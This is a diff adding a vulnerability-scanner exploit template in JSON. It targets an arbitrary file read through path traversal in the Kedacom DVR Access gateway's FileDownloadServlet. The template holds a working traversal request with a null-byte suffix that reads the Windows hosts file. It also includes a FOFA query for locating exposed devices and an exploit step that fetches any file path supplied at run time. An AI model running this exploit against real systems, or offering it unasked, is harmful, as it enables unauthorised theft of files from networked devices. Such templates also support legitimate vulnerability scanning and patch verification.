@@ -1,0 +1,105 @@
+{
+  "Name": "Kedacom DVR Access gateway File Read",
+  "Description": "Kadacom DVR access gateway arbitrary file traversal.",
+  "Product": "Kedacom-DVR-Access-gateway",
+  "Homepage": "https://www.kedacom.com/",
+  "DisclosureDate": "2016-02-16",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Kedacom-DVR-Access-gateway\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0175893"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "input",
+      "value": "../../../../../../../../../../Windows/System32/drivers/etc/hosts",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/gatewayweb/FileDownloadServlet?fileName=%B5%DA%C8%FD%B7%BD%BD%E2%C2%EB%B2%E5%BC%FE.rar&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2",
+        "follow_redirect": false,
+        "header": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+          "Accept-Encoding": "gzip, deflate",
+          "Connection": "keep-alive"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$head",
+            "operation": "contains",
+            "value": "attachment",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "localhost",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Exploitsteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/gatewayweb/FileDownloadServlet?fileName=%B5%DA%C8%FD%B7%BD%BD%E2%C2%EB%B2%E5%BC%FE.rar&filePath={{{file}}}%00.jpg&type=2",
+        "follow_redirect": false,
+        "header": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+          "Accept-Encoding": "gzip, deflate",
+          "Connection": "keep-alive"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "SetVariable": ["output|lastbody"]
+    }
+  ],
+  "Tags": ["fileread"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Kedacom-DVR-Access-gateway"]
+  }
+}
